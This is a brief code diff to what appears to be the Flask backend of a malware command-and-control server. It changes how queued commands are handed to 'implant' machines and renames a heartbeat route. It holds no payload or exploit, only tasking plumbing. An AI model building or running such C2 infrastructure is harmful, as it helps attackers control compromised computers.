@@ -97,6 +97,9 @@ def get_next_command():
 
             if impl_id:
                 next_command = Command.query.filter_by(
+                    computer_guid=impl_id, status="taken_by_implant").first()
+                if not next_command:
+                    next_command = Command.query.filter_by(
                     computer_guid=impl_id, status="not_taken_by_implant").first()
                 print(next_command)
                 if next_command:
@@ -111,7 +114,7 @@ def get_next_command():
                     db.session.commit()
                     return jsonify({"command_id": cmd_id, "command_text": command,"command_type":command_type})
                 else:
-                    return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
+                    return jsonify({"command_id": "-1", "command_text": "No command","command_type":"gaga"})
         except Exception as e:
             print(e)
 
@@ -165,7 +168,7 @@ def store_command_results():
 
 
 @bp.route('/heartbeat', methods=['POST'])
-def heartbeat():
+def heartbeat1():
     if request.method == 'POST':
         try:
             imp_id = request.json['computer_guid']
